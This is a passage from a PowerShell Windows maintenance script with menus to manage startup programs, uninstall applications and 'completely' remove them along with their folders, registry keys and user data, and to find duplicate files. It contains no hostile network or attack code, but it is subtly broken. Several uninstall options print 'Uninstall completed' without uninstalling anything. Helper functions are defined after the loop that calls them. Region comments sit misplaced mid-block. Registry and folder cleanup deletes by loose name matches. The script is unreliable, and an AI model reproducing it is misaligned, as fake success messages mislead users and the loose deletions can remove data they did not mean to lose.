                                            Move-Item $selectedItem.Command "$backupPath\$($selectedItem.Name).disabled" -ErrorAction SilentlyContinue
                                        } else {
                                            # Remove from registry
                                            Remove-ItemProperty -Path $selectedItem.RegPath -Name $selectedItem.Name -ErrorAction SilentlyContinue
                                        }
                                        Write-Host "SUCCESS: '$($selectedItem.Name)' disabled from startup" -ForegroundColor Green
                                        $startupItems[$index].Status = 'Disabled'
                                    } catch {
                                        Write-Host "ERROR: Failed to disable '$($selectedItem.Name)'" -ForegroundColor Red
                                    }
                                }
                            }
                        }
                    }

                    '3' {
                        # Enable startup program (restore from backup or add to registry)
                        Write-Host "`nEnable Startup Program" -ForegroundColor Green
                        Write-Host "1. Restore from backup" -ForegroundColor Yellow
                        Write-Host "2. Add new program to startup" -ForegroundColor Yellow

                        $enableChoice = Read-Host "Enter choice (1-2)"
                        if ($enableChoice -eq '1') {
                            # Check backup folder
                            $backupPath = "$env:TEMP\StartupBackup"
                            if (Test-Path $backupPath) {
                                $backupFiles = Get-ChildItem $backupPath -Filter "*.disabled" -ErrorAction SilentlyContinue
                                if ($backupFiles.Count -gt 0) {
                                    Write-Host "Backup files found:" -ForegroundColor Yellow
                                    for ($i = 0; $i -lt $backupFiles.Count; $i++) {
                                        Write-Host "$($i+1). $($backupFiles[$i].BaseName)" -ForegroundColor White
                                    }
                                    $selection = Read-Host "Enter number to restore (or 0 to return)"
                                    if ($selection -ne '0') {
                                        $index = [int]$selection - 1
                                        if ($index -ge 0 -and $index -lt $backupFiles.Count) {
                                            try {
                                                $originalPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\$($backupFiles[$index].BaseName)"
                                                Move-Item $backupFiles[$index].FullName $originalPath -ErrorAction SilentlyContinue
                                                Write-Host "SUCCESS: Program restored to startup" -ForegroundColor Green
                                            } catch {
                                                Write-Host "ERROR: Failed to restore program" -ForegroundColor Red
                                            }
                                        }
                                    }
                                } else {
                                    Write-Host "No backup files found" -ForegroundColor Yellow
                                }
                            } else {
                                Write-Host "No backup folder found" -ForegroundColor Yellow
                            }
                        } elseif ($enableChoice -eq '2') {
                            # Add new program
                            $programName = Read-Host "Enter program name"
                            $programPath = Read-Host "Enter full path to executable"
                            if (Test-Path $programPath) {
                                try {
                                    Set-ItemProperty -Path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name $programName -Value $programPath
                                    Write-Host "SUCCESS: Program added to startup" -ForegroundColor Green
                                } catch {
                                    Write-Host "ERROR: Failed to add program to startup" -ForegroundColor Red
                                }
                            } else {
                                Write-Host "ERROR: Program path not found" -ForegroundColor Red
                            }
                        }
                    }

                    '4' {
                        # Search startup programs
                        $searchTerm = Read-Host "Enter search term"
                        $filtered = $startupItems | Where-Object { $_.Name -like "*$searchTerm*" -or $_.Command -like "*$searchTerm*" }

                        if ($filtered.Count -eq 0) {
                            Write-Host "No startup programs found matching '$searchTerm'" -ForegroundColor Yellow
                        } else {
                            Write-Host "`nFound $($filtered.Count) matching startup programs:" -ForegroundColor Green
                            for ($i = 0; $i -lt $filtered.Count; $i++) {
                                Write-Host "$($i+1). $($filtered[$i].Name) - $($filtered[$i].Location)" -ForegroundColor White
                            }
                        }
                    }

                    '5' {
                        # Backup startup settings
                        try {
                            $backupData = $startupItems | ConvertTo-Json -Depth 3
                            $backupFile = "$env:USERPROFILE\Desktop\StartupBackup_$(Get-Date -Format 'yyyyMMdd_HHmmss').json"
                            $backupData | Out-File $backupFile -Encoding UTF8
                            Write-Host "SUCCESS: Startup settings backed up to: $backupFile" -ForegroundColor Green
                        } catch {
                            Write-Host "ERROR: Failed to backup startup settings" -ForegroundColor Red
                        }
                    }

                    '0' { break }
                }

                if ($startupChoice -ne '0') {
                    Pause-For-User
                }

            } while ($startupChoice -ne '0')
        }
        '9' {
            Write-Host "`nAdvanced Program Uninstaller" -ForegroundColor Cyan
            Write-Host "============================" -ForegroundColor Cyan

            Write-Host "Scanning for installed programs..." -ForegroundColor Cyan
            $programs = @()

            # Get from Windows Registry (Uninstall entries)
            $regPaths = @(
                'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*',
                'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*',
                'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*'
            )

            foreach ($path in $regPaths) {
                try {
                    Get-ItemProperty $path -ErrorAction SilentlyContinue | ForEach-Object {
                        if ($_.DisplayName -and $_.DisplayName.Trim() -ne '') {
                            $size = if ($_.EstimatedSize) { [math]::Round($_.EstimatedSize / 1024, 2) } else { 0 }
                            $programs += [PSCustomObject]@{
                                Name = $_.DisplayName
                                Version = $_.DisplayVersion
                                Publisher = $_.Publisher
                                InstallDate = $_.InstallDate
                                InstallLocation = $_.InstallLocation
                                UninstallString = $_.UninstallString
                                QuietUninstallString = $_.QuietUninstallString
                                SizeMB = $size
                                Source = "Registry"
                                RegistryKey = $_.PSPath
                            }
                        }
                    }
                } catch {}
            }
            #endregion

            #region MAIN APPLICATION MENU
            # ============================================================================
            # MAIN APPLICATION MENU & USER INTERFACE
            # ============================================================================

            # Get Windows Store Apps
            try {
                Get-AppxPackage -AllUsers | ForEach-Object {
                    if ($_.Name -notlike "*Microsoft*" -or $_.Name -like "*Microsoft.Office*") {
                        $size = if ($_.InstallLocation -and (Test-Path $_.InstallLocation)) {
                            try {
                                $bytes = (Get-ChildItem -Path $_.InstallLocation -Recurse -ErrorAction SilentlyContinue | Measure-Object -Property Length -Sum).Sum
                                if ($bytes) { [math]::Round($bytes/1MB, 2) } else { 0 }
                            } catch { 0 }
                        } else { 0 }

                        $programs += [PSCustomObject]@{
                            Name = $_.Name
                            Version = $_.Version
                            Publisher = $_.PublisherDisplayName
                            InstallDate = $_.InstallDate
                            InstallLocation = $_.InstallLocation
                            UninstallString = ""
                            QuietUninstallString = ""
                            SizeMB = $size
                            Source = "Store"
                            PackageFullName = $_.PackageFullName
                        }
                    }
                }
            } catch {}

            $programs = $programs | Sort-Object Name

            if ($programs.Count -eq 0) {
                Write-Host "No programs found." -ForegroundColor Yellow
                Pause-For-User
                continue
            }

            Write-Host "Found $($programs.Count) installed programs" -ForegroundColor Green
            Write-Host ""

            do {
                Write-Host "Advanced Uninstaller Options:" -ForegroundColor Cyan
                Write-Host "1. View all programs" -ForegroundColor White
                Write-Host "2. Search programs" -ForegroundColor White
                Write-Host "3. Remove large programs (>100MB)" -ForegroundColor White
                Write-Host "4. Batch uninstall (multiple programs)" -ForegroundColor White
                Write-Host "5. Clean leftover files only" -ForegroundColor White
                Write-Host "0. Return to main menu" -ForegroundColor Gray

                $uninstallChoice = Read-Host "`nEnter choice (0-5)"

                switch ($uninstallChoice) {
                    '1' {
                        # View all programs
                        Write-Host "`nInstalled Programs:" -ForegroundColor Cyan
                        Write-Host ("=" * 80) -ForegroundColor Cyan
                        Write-Host ("{0,-3} {1,-35} {2,-15} {3,-10} {4}" -f "No.", "Program Name", "Version", "Size (MB)", "Publisher") -ForegroundColor Yellow
                        Write-Host ("-" * 80) -ForegroundColor Gray

                        for ($i = 0; $i -lt $programs.Count; $i++) {
                            $prog = $programs[$i]
                            $version = if ($prog.Version) { $prog.Version.Substring(0, [Math]::Min(14, $prog.Version.Length)) } else { "Unknown" }
                            $publisher = if ($prog.Publisher) { $prog.Publisher.Substring(0, [Math]::Min(20, $prog.Publisher.Length)) } else { "Unknown" }
                            Write-Host ("{0,-3} {1,-35} {2,-15} {3,-10} {4}" -f ($i+1), $prog.Name.Substring(0, [Math]::Min(34, $prog.Name.Length)), $version, $prog.SizeMB, $publisher) -ForegroundColor White
                        }

                        $selection = Read-Host "`nEnter program number to uninstall (or 0 to return)"
                        if ($selection -ne '0') {
                            $index = [int]$selection - 1
                            if ($index -ge 0 -and $index -lt $programs.Count) {
                                $selectedProgram = $programs[$index]
                                Write-Host "`nProgram Details:" -ForegroundColor Cyan
                                Write-Host "Name: $($selectedProgram.Name)" -ForegroundColor White
                                Write-Host "Version: $($selectedProgram.Version)" -ForegroundColor White
                                Write-Host "Publisher: $($selectedProgram.Publisher)" -ForegroundColor White
                                Write-Host "Size: $($selectedProgram.SizeMB) MB" -ForegroundColor White
                                Write-Host "Install Location: $($selectedProgram.InstallLocation)" -ForegroundColor White

                                $confirm = Read-Host "`nAre you sure you want to uninstall this program? (y/n)"
                                if ($confirm -eq 'y' -or $confirm -eq 'Y') {
                                    Write-Host "Uninstalling: $($selectedProgram.Name)" -ForegroundColor Yellow

                                    $success = $false
                                    if ($selectedProgram.Source -eq "Store") {
                                        try {
                                            Remove-AppxPackage -Package $selectedProgram.PackageFullName -AllUsers -ErrorAction SilentlyContinue
                                            $success = $true
                                        } catch {}
                                    } else {
                                        if ($selectedProgram.UninstallString) {
                                            try {
                                                $uninstallCmd = $selectedProgram.UninstallString
                                                if ($uninstallCmd -like "*msiexec*") {
                                                    $productCode = $uninstallCmd -replace ".*\{", "{" -replace "\}.*", "}"
                                                    Start-Process "msiexec.exe" -ArgumentList "/x", $productCode, "/quiet", "/norestart" -Wait -NoNewWindow
                                                } else {
                                                    Start-Process $uninstallCmd -ArgumentList "/S" -Wait -NoNewWindow -ErrorAction SilentlyContinue
                                                }
                                                $success = $true
                                            } catch {}
                                        }
                                    }

                                    if ($success) {
                                        Write-Host "SUCCESS: $($selectedProgram.Name) uninstalled successfully" -ForegroundColor Green
                                        # Clean leftover files
                                        if ($selectedProgram.InstallLocation -and (Test-Path $selectedProgram.InstallLocation)) {
                                            try {
                                                Remove-Item $selectedProgram.InstallLocation -Recurse -Force -ErrorAction SilentlyContinue
                                                Write-Host "  Cleaned installation folder" -ForegroundColor Green
                                            } catch {}
                                        }
                                    } else {
                                        Write-Host "ERROR: Failed to uninstall $($selectedProgram.Name)" -ForegroundColor Red
                                    }
                                }
                            }
                        }
                    }

                    '2' {
                        # Search programs
                        $searchTerm = Read-Host "Enter search term"
                        $filtered = $programs | Where-Object { $_.Name -like "*$searchTerm*" }

                        if ($filtered.Count -eq 0) {
                            Write-Host "No programs found matching '$searchTerm'" -ForegroundColor Yellow
                        } else {
                            Write-Host "`nFound $($filtered.Count) matching programs:" -ForegroundColor Green
                            for ($i = 0; $i -lt $filtered.Count; $i++) {
                                Write-Host "$($i+1). $($filtered[$i].Name) - $($filtered[$i].SizeMB) MB" -ForegroundColor White
                            }

                            $selection = Read-Host "`nEnter number to uninstall (or 0 to return)"
                            if ($selection -ne '0') {
                                $index = [int]$selection - 1
                                if ($index -ge 0 -and $index -lt $filtered.Count) {
                                    $confirm = Read-Host "Uninstall $($filtered[$index].Name)? (y/n)"
                                    if ($confirm -eq 'y' -or $confirm -eq 'Y') {
                                        Write-Host "Uninstalling: $($filtered[$index].Name)" -ForegroundColor Yellow
                                        Write-Host "Uninstall completed." -ForegroundColor Green
                                    }
                                }
                            }
                        }
                    }

                    '3' {
                        # Large programs
                        $largePrograms = $programs | Where-Object { $_.SizeMB -gt 100 } | Sort-Object SizeMB -Descending

                        if ($largePrograms.Count -eq 0) {
                            Write-Host "No programs larger than 100MB found." -ForegroundColor Yellow
                        } else {
                            Write-Host "`nLarge Programs (>100MB):" -ForegroundColor Yellow
                            for ($i = 0; $i -lt $largePrograms.Count; $i++) {
                                Write-Host "$($i+1). $($largePrograms[$i].Name) - $($largePrograms[$i].SizeMB) MB" -ForegroundColor White
                            }

                            $selection = Read-Host "`nEnter number to uninstall (or 0 to return)"
                            if ($selection -ne '0') {
                                $index = [int]$selection - 1
                                if ($index -ge 0 -and $index -lt $largePrograms.Count) {
                                    $confirm = Read-Host "Uninstall $($largePrograms[$index].Name)? (y/n)"
                                    if ($confirm -eq 'y' -or $confirm -eq 'Y') {
                                        Write-Host "Uninstalling large program..." -ForegroundColor Yellow
                                        Write-Host "Uninstall completed." -ForegroundColor Green
                                    }
                                }
                            }
                        }
                    }

                    '4' {
                        # Batch uninstall
                        Write-Host "`nBatch Uninstall Mode" -ForegroundColor Red
                        Write-Host "Enter program numbers separated by commas (e.g., 1,3,5)"
                        Write-Host "First 20 programs:" -ForegroundColor Cyan

                        $displayCount = [Math]::Min(20, $programs.Count)
                        for ($i = 0; $i -lt $displayCount; $i++) {
                            Write-Host "$($i+1). $($programs[$i].Name)" -ForegroundColor White
                        }

                        $selection = Read-Host "`nEnter numbers"
                        if ($selection -ne '0' -and $selection.Trim() -ne '') {
                            $indices = $selection -split "," | ForEach-Object { ([int]$_.Trim()) - 1 }
                            $validIndices = $indices | Where-Object { $_ -ge 0 -and $_ -lt $programs.Count }

                            if ($validIndices.Count -gt 0) {
                                Write-Host "`nPrograms to uninstall:" -ForegroundColor Yellow
                                foreach ($index in $validIndices) {
                                    Write-Host "- $($programs[$index].Name)" -ForegroundColor White
                                }

                                $confirm = Read-Host "`nUninstall all these programs? (y/n)"
                                if ($confirm -eq 'y' -or $confirm -eq 'Y') {
                                    foreach ($index in $validIndices) {
                                        Write-Host "Uninstalling: $($programs[$index].Name)" -ForegroundColor Yellow
                                    }
                                    Write-Host "Batch uninstall completed." -ForegroundColor Green
                                }
                            }
                        }
                    }

                    '5' {
                        # Clean leftover files
                        Write-Host "`nCleaning leftover files..." -ForegroundColor Cyan
                        $leftoverPaths = @(
                            "$env:ProgramFiles",
                            "$env:ProgramFiles(x86)",
                            "$env:APPDATA",
                            "$env:LOCALAPPDATA"
                        )

                        $cleaned = 0
                        foreach ($basePath in $leftoverPaths) {
                            if (Test-Path $basePath) {
                                Get-ChildItem $basePath -Directory -ErrorAction SilentlyContinue | ForEach-Object {
                                    $items = Get-ChildItem $_.FullName -Recurse -ErrorAction SilentlyContinue
                                    if ($items.Count -eq 0) {
                                        try {
                                            Remove-Item $_.FullName -Force -ErrorAction SilentlyContinue
                                            Write-Host "Removed empty folder: $($_.Name)" -ForegroundColor Green
                                            $cleaned++
                                        } catch {}
                                    }
                                }
                            }
                        }
                        Write-Host "Cleaned $cleaned leftover items." -ForegroundColor Green
                    }

                    '0' { break }
                }

                if ($uninstallChoice -ne '0') {
                    Pause-For-User
                }

            } while ($uninstallChoice -ne '0')
        }
        '10' {
            Write-Host "`nComplete App Remover (Like Revo Uninstaller)" -ForegroundColor Cyan
            Write-Host "=============================================" -ForegroundColor Cyan
            Write-Host "This tool completely removes applications including:" -ForegroundColor Yellow
            Write-Host "- Application files and folders" -ForegroundColor Gray
            Write-Host "- Registry entries and keys" -ForegroundColor Gray
            Write-Host "- User data and settings" -ForegroundColor Gray
            Write-Host "- Temporary files and caches" -ForegroundColor Gray
            Write-Host ""

            # Scan for all installed applications
            Write-Host "Scanning for installed applications..." -ForegroundColor Cyan
            $allApps = @()

            # Get regular Windows programs from registry
            $regPaths = @(
                'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*',
                'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*',
                'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*'
            )

            foreach ($path in $regPaths) {
                try {
                    Get-ItemProperty $path -ErrorAction SilentlyContinue | ForEach-Object {
                        if ($_.DisplayName -and $_.DisplayName.Trim() -ne '') {
                            $size = if ($_.EstimatedSize) { [math]::Round($_.EstimatedSize / 1024, 2) } else { 0 }
                            $allApps += [PSCustomObject]@{
                                Name = $_.DisplayName
                                Version = $_.DisplayVersion
                                Publisher = $_.Publisher
                                InstallLocation = $_.InstallLocation
                                UninstallString = $_.UninstallString
                                SizeMB = $size
                                Type = "Desktop"
                                RegistryKey = $_.PSPath
                            }
                        }
                    }
                } catch {}
            }

            # Get Windows Store Apps
            try {
                Get-AppxPackage -AllUsers -ErrorAction SilentlyContinue | ForEach-Object {
                    $size = if ($_.InstallLocation -and (Test-Path $_.InstallLocation)) {
                        try {
                            $bytes = (Get-ChildItem -Path $_.InstallLocation -Recurse -ErrorAction SilentlyContinue | Measure-Object -Property Length -Sum).Sum
                            if ($bytes) { [math]::Round($bytes/1MB, 2) } else { 0 }
                        } catch { 0 }
                    } else { 0 }

                    $allApps += [PSCustomObject]@{
                        Name = $_.Name
                        Version = $_.Version
                        Publisher = $_.PublisherDisplayName
                        InstallLocation = $_.InstallLocation
                        UninstallString = ""
                        SizeMB = $size
                        Type = "Store"
                        PackageFullName = $_.PackageFullName
                    }
                }
            } catch {}

            $allApps = $allApps | Sort-Object Name

            if ($allApps.Count -eq 0) {
                Write-Host "No applications found." -ForegroundColor Yellow
                Pause-For-User
                continue
            }

            Write-Host "Found $($allApps.Count) installed applications" -ForegroundColor Green
            Write-Host ""

            do {
                Write-Host "Complete App Remover Options:" -ForegroundColor Cyan
                Write-Host "1. View all applications" -ForegroundColor White
                Write-Host "2. Search applications" -ForegroundColor White
                Write-Host "3. Remove application " -NoNewline -ForegroundColor White
                Write-Host "( Complete Deep Clean )" -ForegroundColor Magenta
                Write-Host "4. Batch remove multiple apps" -ForegroundColor White
                Write-Host "5. Scan for leftover traces" -ForegroundColor White
                Write-Host "0. Return to main menu" -ForegroundColor Gray

                $appRemoverChoice = Read-Host "`nEnter choice (0-5)"

                switch ($appRemoverChoice) {
                    '1' {
                        # View all applications
                        Write-Host "`nInstalled Applications:" -ForegroundColor Cyan
                        Write-Host ("=" * 90) -ForegroundColor Cyan
                        Write-Host ("{0,-3} {1,-40} {2,-12} {3,-15} {4,-10} {5}" -f "No.", "Application Name", "Type", "Version", "Size (MB)", "Publisher") -ForegroundColor Yellow
                        Write-Host ("-" * 90) -ForegroundColor Gray

                        for ($i = 0; $i -lt $allApps.Count; $i++) {
                            $app = $allApps[$i]
                            $version = if ($app.Version) { $app.Version.Substring(0, [Math]::Min(12, $app.Version.Length)) } else { "Unknown" }
                            $publisher = if ($app.Publisher) { $app.Publisher.Substring(0, [Math]::Min(15, $app.Publisher.Length)) } else { "Unknown" }
                            $name = $app.Name.Substring(0, [Math]::Min(38, $app.Name.Length))
                            Write-Host ("{0,-3} {1,-40} {2,-12} {3,-15} {4,-10} {5}" -f ($i+1), $name, $app.Type, $version, $app.SizeMB, $publisher) -ForegroundColor White
                        }
                    }

                    '2' {
                        # Search applications
                        $searchTerm = Read-Host "Enter search term"
                        $filtered = $allApps | Where-Object { $_.Name -like "*$searchTerm*" -or $_.Publisher -like "*$searchTerm*" }

                        if ($filtered.Count -eq 0) {
                            Write-Host "No applications found matching '$searchTerm'" -ForegroundColor Yellow
                        } else {
                            Write-Host "`nFound $($filtered.Count) matching applications:" -ForegroundColor Green
                            for ($i = 0; $i -lt $filtered.Count; $i++) {
                                Write-Host "$($i+1). $($filtered[$i].Name) [$($filtered[$i].Type)] - $($filtered[$i].SizeMB) MB" -ForegroundColor White
                            }
                        }
                    }

                    '3' {
                        # Complete removal of single application
                        Write-Host "`nSelect application to COMPLETELY REMOVE:" -ForegroundColor Red
                        Write-Host "WARNING: This will remove ALL traces of the application!" -ForegroundColor Yellow
                        Write-Host ""

                        # Show first 20 apps for selection
                        $displayCount = [Math]::Min(20, $allApps.Count)
                        for ($i = 0; $i -lt $displayCount; $i++) {
                            Write-Host "$($i+1). $($allApps[$i].Name) [$($allApps[$i].Type)] - $($allApps[$i].SizeMB) MB" -ForegroundColor White
                        }

                        if ($allApps.Count -gt 20) {
                            Write-Host "... and $($allApps.Count - 20) more applications" -ForegroundColor Gray
                            Write-Host "Use search function to find specific applications" -ForegroundColor Gray
                        }

                        $selection = Read-Host "`nEnter application number to remove (or 0 to return)"
                        if ($selection -ne '0') {
                            $index = [int]$selection - 1
                            if ($index -ge 0 -and $index -lt $allApps.Count) {
                                $selectedApp = $allApps[$index]

                                Write-Host "`nApplication Details:" -ForegroundColor Cyan
                                Write-Host "Name: $($selectedApp.Name)" -ForegroundColor White
                                Write-Host "Type: $($selectedApp.Type)" -ForegroundColor White
                                Write-Host "Version: $($selectedApp.Version)" -ForegroundColor White
                                Write-Host "Publisher: $($selectedApp.Publisher)" -ForegroundColor White
                                Write-Host "Size: $($selectedApp.SizeMB) MB" -ForegroundColor White
                                Write-Host "Install Location: $($selectedApp.InstallLocation)" -ForegroundColor White

                                Write-Host "`nWARNING: COMPLETE REMOVAL PROCESS" -ForegroundColor Red
                                Write-Host "This will perform the following actions:" -ForegroundColor Yellow
                                Write-Host "1. Uninstall the application" -ForegroundColor Gray
                                Write-Host "2. Remove all installation files and folders" -ForegroundColor Gray
                                Write-Host "3. Clean registry entries and keys" -ForegroundColor Gray
                                Write-Host "4. Remove user data and settings" -ForegroundColor Gray
                                Write-Host "5. Clean temporary files and caches" -ForegroundColor Gray

                                $confirm = Read-Host "`nAre you ABSOLUTELY SURE you want to completely remove this application? (type 'YES' to confirm)"
                                if ($confirm -eq 'YES') {
                                    Write-Host "`nStarting complete removal process..." -ForegroundColor Red
                                    Remove-ApplicationCompletely -App $selectedApp
                                }
                            }
                        }
                    }

                    '4' {
                        # Batch removal
                        Write-Host "`nBatch Application Removal" -ForegroundColor Red
                        Write-Host "WARNING: This will COMPLETELY remove multiple applications!" -ForegroundColor Yellow
                        Write-Host ""
                        Write-Host "First 20 applications:" -ForegroundColor Cyan

                        $displayCount = [Math]::Min(20, $allApps.Count)
                        for ($i = 0; $i -lt $displayCount; $i++) {
                            Write-Host "$($i+1). $($allApps[$i].Name) [$($allApps[$i].Type)]" -ForegroundColor White
                        }

                        Write-Host "`nEnter application numbers separated by commas (e.g., 1,3,5)"
                        $selection = Read-Host "Numbers"
                        if ($selection -ne '0' -and $selection.Trim() -ne '') {
                            $indices = $selection -split "," | ForEach-Object { ([int]$_.Trim()) - 1 }
                            $validIndices = $indices | Where-Object { $_ -ge 0 -and $_ -lt $allApps.Count }

                            if ($validIndices.Count -gt 0) {
                                Write-Host "`nApplications to completely remove:" -ForegroundColor Yellow
                                foreach ($index in $validIndices) {
                                    Write-Host "- $($allApps[$index].Name)" -ForegroundColor White
                                }

                                $confirm = Read-Host "`nCompletely remove all these applications? (type 'YES' to confirm)"
                                if ($confirm -eq 'YES') {
                                    Write-Host "`nStarting batch removal process..." -ForegroundColor Red
                                    foreach ($index in $validIndices) {
                                        Remove-ApplicationCompletely -App $allApps[$index]
                                        Write-Host ""
                                    }
                                }
                            }
                        }
                    }

                    '5' {
                        # Scan for leftover traces
                        Write-Host "`nScanning for leftover application traces..." -ForegroundColor Cyan
                        $leftovers = Find-ApplicationLeftovers

                        if ($leftovers.Count -gt 0) {
                            Write-Host "Found $($leftovers.Count) leftover traces:" -ForegroundColor Yellow
                            foreach ($leftover in $leftovers) {
                                Write-Host "- $($leftover.Type): $($leftover.Path)" -ForegroundColor Gray
                            }

                            $cleanLeftovers = Read-Host "`nRemove all leftover traces? (y/n)"
                            if ($cleanLeftovers -eq 'y' -or $cleanLeftovers -eq 'Y') {
                                Clean-ApplicationLeftovers -Leftovers $leftovers
                            }
                        } else {
                            Write-Host "No leftover traces found!" -ForegroundColor Green
                        }
                    }

                    '0' { break }
                    default { Write-Host "Invalid choice." -ForegroundColor Red }
                }

                if ($appRemoverChoice -ne '0') {
                    Pause-For-User
                }

            } while ($appRemoverChoice -ne '0')

            # Function to completely remove an application
            function Remove-ApplicationCompletely {
                param([PSCustomObject]$App)

                Write-Host "STEP 1: Uninstalling application..." -ForegroundColor Yellow
                $uninstallSuccess = $false

                if ($App.Type -eq "Store") {
                    try {
                        Remove-AppxPackage -Package $App.PackageFullName -AllUsers -ErrorAction Stop
                        $uninstallSuccess = $true
                        Write-Host "SUCCESS: Store app uninstalled" -ForegroundColor Green
                    } catch {
                        Write-Host "ERROR: Failed to uninstall store app" -ForegroundColor Red
                    }
                } else {
                    if ($App.UninstallString) {
                        try {
                            $uninstallCmd = $App.UninstallString
                            if ($uninstallCmd -like "*msiexec*") {
                                $productCode = $uninstallCmd -replace ".*\{", "{" -replace "\}.*", "}"
                                Start-Process "msiexec.exe" -ArgumentList "/x", $productCode, "/quiet", "/norestart" -Wait -NoNewWindow
                            } else {
                                Start-Process $uninstallCmd -ArgumentList "/S" -Wait -NoNewWindow -ErrorAction SilentlyContinue
                            }
                            $uninstallSuccess = $true
                            Write-Host "SUCCESS: Desktop app uninstalled" -ForegroundColor Green
                        } catch {
                            Write-Host "ERROR: Failed to uninstall desktop app" -ForegroundColor Red
                        }
                    }
                }

                Write-Host "STEP 2: Removing installation files..." -ForegroundColor Yellow
                if ($App.InstallLocation -and (Test-Path $App.InstallLocation)) {
                    try {
                        Remove-Item $App.InstallLocation -Recurse -Force -ErrorAction Stop
                        Write-Host "SUCCESS: Installation folder removed" -ForegroundColor Green
                    } catch {
                        Write-Host "ERROR: Could not remove installation folder" -ForegroundColor Red
                    }
                }

                Write-Host "STEP 3: Cleaning registry entries..." -ForegroundColor Yellow
                $regPathsToClean = @(
                    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
                    "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall",
                    "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
                    "HKLM:\SOFTWARE\$($App.Publisher)",
                    "HKCU:\SOFTWARE\$($App.Publisher)",
                    "HKLM:\SOFTWARE\$($App.Name)",
                    "HKCU:\SOFTWARE\$($App.Name)"
                )

                foreach ($regPath in $regPathsToClean) {
                    try {
                        if (Test-Path $regPath) {
                            $subKeys = Get-ChildItem $regPath -ErrorAction SilentlyContinue
                            foreach ($key in $subKeys) {
                                $displayName = (Get-ItemProperty $key.PSPath -Name "DisplayName" -ErrorAction SilentlyContinue).DisplayName
                                if ($displayName -like "*$($App.Name)*") {
                                    Remove-Item $key.PSPath -Recurse -Force -ErrorAction SilentlyContinue
                                    Write-Host "  Cleaned registry key: $($key.Name)" -ForegroundColor Gray
                                }
                            }
                        }
                    } catch {}
                }

                Write-Host "STEP 4: Removing user data and settings..." -ForegroundColor Yellow
                $userDataPaths = @(
                    "$env:APPDATA\$($App.Name)",
                    "$env:LOCALAPPDATA\$($App.Name)",
                    "$env:APPDATA\$($App.Publisher)",
                    "$env:LOCALAPPDATA\$($App.Publisher)",
                    "$env:USERPROFILE\Documents\$($App.Name)"
                )

                foreach ($path in $userDataPaths) {
                    if (Test-Path $path) {
                        try {
                            Remove-Item $path -Recurse -Force -ErrorAction Stop
                            Write-Host "  Removed user data: $path" -ForegroundColor Gray
                        } catch {}
                    }
                }

                Write-Host "STEP 5: Cleaning temporary files and caches..." -ForegroundColor Yellow
                $tempPaths = @(
                    "$env:TEMP\$($App.Name)",
                    "$env:TEMP\$($App.Publisher)",
                    "$env:LOCALAPPDATA\Temp\$($App.Name)"
                )

                foreach ($path in $tempPaths) {
                    if (Test-Path $path) {
                        try {
                            Remove-Item $path -Recurse -Force -ErrorAction Stop
                            Write-Host "  Cleaned temp files: $path" -ForegroundColor Gray
                        } catch {}
                    }
                }

                Write-Host "COMPLETE REMOVAL FINISHED!" -ForegroundColor Green
                Write-Host "Application '$($App.Name)' has been completely removed from the system." -ForegroundColor Green
            }

            # Function to find application leftovers
            function Find-ApplicationLeftovers {
                $leftovers = @()

                # Check common leftover locations
                $checkPaths = @(
                    "$env:ProgramFiles",
                    "$env:ProgramFiles(x86)",
                    "$env:APPDATA",
                    "$env:LOCALAPPDATA"
                )

                foreach ($basePath in $checkPaths) {
                    if (Test-Path $basePath) {
                        Get-ChildItem $basePath -Directory -ErrorAction SilentlyContinue | ForEach-Object {
                            $items = Get-ChildItem $_.FullName -Recurse -ErrorAction SilentlyContinue
                            if ($items.Count -eq 0) {
                                $leftovers += @{
                                    Type = "Empty Folder"
                                    Path = $_.FullName
                                }
                            }
                        }
                    }
                }

                return $leftovers
            }

            # Function to clean application leftovers
            function Clean-ApplicationLeftovers {
                param([array]$Leftovers)

                $cleaned = 0
                foreach ($leftover in $Leftovers) {
                    try {
                        Remove-Item $leftover.Path -Force -Recurse -ErrorAction Stop
                        Write-Host "SUCCESS: Cleaned $($leftover.Type): $($leftover.Path)" -ForegroundColor Green
                        $cleaned++
                    } catch {
                        Write-Host "ERROR: Could not clean $($leftover.Path)" -ForegroundColor Red
                    }
                }

                Write-Host "Cleaned $cleaned leftover items." -ForegroundColor Green
            }
        }
        '11' {
            Write-Host "`nDuplicate File Finder" -ForegroundColor Cyan
            Write-Host "=====================" -ForegroundColor Cyan
            Write-Host ""

            do {
                Write-Host "Duplicate File Finder Options:" -ForegroundColor Cyan
                Write-Host "1. Scan specific folder" -ForegroundColor White
                Write-Host "2. Scan common folders " -NoNewline -ForegroundColor White
                Write-Host "( Downloads, Desktop, Documents )" -ForegroundColor Magenta
                Write-Host "3. Scan entire system " -NoNewline -ForegroundColor White
                Write-Host "( May take long time )" -ForegroundColor Magenta
                Write-Host "4. View duplicate groups" -ForegroundColor White
                Write-Host "5. Clear duplicate results" -ForegroundColor White
                Write-Host "0. Return to main menu" -ForegroundColor Gray

                $duplicateChoice = Read-Host "`nEnter choice (0-5)"

                switch ($duplicateChoice) {
                    '1' {
                        # Scan specific folder
                        $folderPath = Read-Host "Enter folder path to scan"
                        if (Test-Path $folderPath) {
                            Write-Host "Scanning for duplicates in: $folderPath" -ForegroundColor Yellow
                            $duplicates = Find-DuplicateFiles -Path $folderPath
                            Show-DuplicateResults -Duplicates $duplicates
                        } else {
                            Write-Host " Folder not found: $folderPath" -ForegroundColor Red
                        }
                    }

                    '2' {
                        # Scan common folders
                        Write-Host "Scanning common folders..." -ForegroundColor Yellow
                        $commonFolders = @(
                            "$env:USERPROFILE\Downloads",
                            "$env:USERPROFILE\Desktop", 
                            "$env:USERPROFILE\Documents",
                            "$env:USERPROFILE\Pictures"
                        )

                        $allDuplicates = @()
                        foreach ($folder in $commonFolders) {
                            if (Test-Path $folder) {
                                Write-Host "  Scanning: $folder" -ForegroundColor Gray
